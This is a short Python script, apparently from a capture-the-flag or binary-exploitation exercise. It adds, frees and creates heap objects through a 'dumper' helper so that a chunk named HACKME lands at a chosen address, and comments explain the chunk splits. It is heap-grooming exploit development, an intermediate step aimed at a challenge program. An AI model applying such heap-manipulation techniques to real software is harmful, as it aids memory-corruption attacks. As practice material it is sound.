import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
from dumper import G
g=G()
g.add(b'A1'); g.add(b'B2'); g.make(b'b1'); g.add(b'YY'); g.add(b'Z9'); g.make(b'b3')
for t in (b'B2',b'Z9',b'A1',b'YY'): g.rm(t)
g.add(b'CC')                 # CC->next=&YY (0x120), remainder 0x90
g.add(b'EE')                 # consume the 0x90 remainder (EE@remainder)
g.make(b'HACKME')            # food F: hope lands at YY (0x120 split)
g.dump('after EE + make HACKME')
g.close()
